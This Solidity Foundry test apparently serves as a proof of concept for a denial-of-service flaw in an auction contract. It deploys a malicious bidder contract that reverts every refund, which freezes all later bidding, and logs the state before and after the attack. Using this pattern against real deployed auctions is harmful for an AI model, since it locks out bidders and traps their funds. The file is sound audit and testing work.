// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/auction.sol";

contract MaliciousBidder {
    DosAuction public auction;
    
    constructor(DosAuction _auction) payable {
        auction = _auction;
    }
    
    // Malicious contract that reverts when receiving refunds
    receive() external payable {
        revert("DoS attack - refund rejected");
    }
    
    function bid(uint256 amount) external payable {
        auction.bid{value: amount}();
    }
}

contract DosAuctionTest is Test {
    DosAuction public auction;
    MaliciousBidder public attacker;
    
    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    
    function setUp() public {
        vm.startPrank(owner);
        auction = new DosAuction();
        auction.startAuction(7 days);
        vm.stopPrank();
        
        // Fund users
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }
    
    function test_ReentrancyDos() public {
        // 1. Baseline test without attacker
        console.log("[DIFFERENTIAL] --- BEFORE ATTACK ---");
        uint256 initialBidAmount = 0.5 ether;
        
        // Place initial bid
        vm.prank(alice);
        auction.bid{value: initialBidAmount}();
        uint256 preBid = auction.currentBid();
        address preRunner = auction.currentFrontrunner();
        console.log("[Before] Alice bid succesfully. Pre-state:");
        console.log("  CurrentBid: %s", preBid);
        console.log("  Frontrunner: %s", preRunner);
        
        // Simulate standard bid operation (amount = currentBid + 1 wei)
        uint256 newBid = preBid + 1;
        console.log("[Action] Bob attempts to bid %s (currentBid + 1 wei)...", newBid);
        vm.prank(bob);
        auction.bid{value: newBid}();
        
        // Capture post-state for baseline
        uint256 postBid = auction.currentBid();
        address postRunner = auction.currentFrontrunner();
        console.log("[After] Standard bid result:");
        console.log("  CurrentBid: %s", postBid);
        console.log("  Frontrunner: %s", postRunner);
        console.log("  [Verification] State updated: %s", (postBid != preBid) ? "YES" : "NO");
    
        // 2. Execute attack scenario
        console.log("\n[DIFFERENTIAL] --- TRIGGER ATTACK ---");
        uint256 attackerAmount = 1.5 ether;
        console.log("[Attack] Deploying malicious bidder with %s...", attackerAmount);
        attacker = new MaliciousBidder{value: attackerAmount}(auction);
        console.log("  Malicious contact deployed at: %s", address(attacker));
        
        console.log("[Attack] Attacker places bid...");
        attacker.bid(attackerAmount);
        uint256 attackBid = auction.currentBid();
        address attackRunner = auction.currentFrontrunner();
        console.log("[Attack] Attack executed successfully!");
        console.log("  CurrentBid: %s", attackBid);
        console.log("  Frontrunner: %s", attackRunner);
        
        // 3. Post-attack validation
        console.log("\n[DIFFERENTIAL] --- AFTER ATTACK ---");
        preBid = attackBid;
        preRunner = attackRunner;
        console.log("[Before] Current state:");
        console.log("  CurrentBid: %s", preBid);
        console.log("  Frontrunner: %s", preRunner);
        
        // Attempt same operation (amount = currentBid + 1)
        newBid = preBid + 1;
        console.log("[Action] Carol attempts to bid %s (currentBid + 1 wei)...", newBid);
        address carol = makeAddr("carol");
        vm.deal(carol, 10 ether);
        vm.prank(carol);
        vm.expectRevert();
        auction.bid{value: newBid}();
        console.log("[After] Bid failed (reverted)!");
        
        // Capture final state
        postBid = auction.currentBid();
        postRunner = auction.currentFrontrunner();
        console.log("  CurrentBid: %s", postBid);
        console.log("  Frontrunner: %s", postRunner);
        
        // Differential verification
        bool stateChanged = (postBid != preBid) || (postRunner != preRunner);
        console.log("[DIFFERENTIAL VERIFICATION]");
        console.log("  Before attack: bidding (current+1) updated state? YES");
        console.log("  After attack: bidding (current+1) updated state? %s", stateChanged ? "YES" : "NO");
        
        if (stateChanged) {
            console.log("Vulnerability not Exist: State changed after attack. DoS attack mitigated");
        } else {
            console.log("Vulnerability Exists: After the attack, bids revert and state remains frozen, confirming DoS vulnerability");
        }
    }
    
    function test_LegitimateBidAfterMalicious() public {
        // Setup the DoS scenario via attacker first
        test_ReentrancyDos();
        
        // 4. Carol attempts to bid after Bob - should also fail
        address carol = makeAddr("carol");
        vm.deal(carol, 10 ether);
        
        vm.prank(carol);
        vm.expectRevert();
        auction.bid{value: 3 ether}();
    }
}